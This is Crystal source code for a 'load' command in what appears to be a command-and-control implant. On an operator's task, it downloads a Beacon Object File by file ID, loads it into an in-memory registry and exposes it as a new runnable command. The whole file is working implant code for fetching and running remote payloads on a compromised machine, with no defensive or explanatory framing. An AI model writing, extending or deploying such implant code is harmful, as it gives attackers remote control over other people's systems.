require "./base"
require "../../elf/registry"

module Dark::Agent::Commands
  class Load < Base
    def name : String
      "load"
    end

    def execute(task : JSON::Any) : Nil
      task_id = task["id"]?.try(&.as_s) || ""
      file_id = task["parameters"]["file_id"]?.try(&.as_s) || ""
      command_name = task["parameters"]["name"]?.try(&.as_s) || ""

      # Verify we have the required information
      if command_name.empty? || file_id.empty?
        MessageHandler.add_response(task_id, :error, "Missing required parameters: command name and file_id")
        return
      end

      # Download BOF from file_id
      log_debug("Downloading BOF '#{command_name}' from file_id: #{file_id}")
      bof_data = command_handler.download_bof_file(file_id, task_id)
      if bof_data.nil?
        MessageHandler.add_response(task_id, :error, "Failed to download BOF file")
        return
      end

      log_debug("Received BOF '#{command_name}' (#{bof_data.size} bytes)")

      # Load the BOF into the registry
      bof_name = bof_registry.load(command_name, bof_data)

      # Add the new command to the registry
      MessageHandler.add_command(bof_name)

      MessageHandler.add_response(task_id, :success, "Successfully loaded BOF: #{bof_name}")
    end

  end
end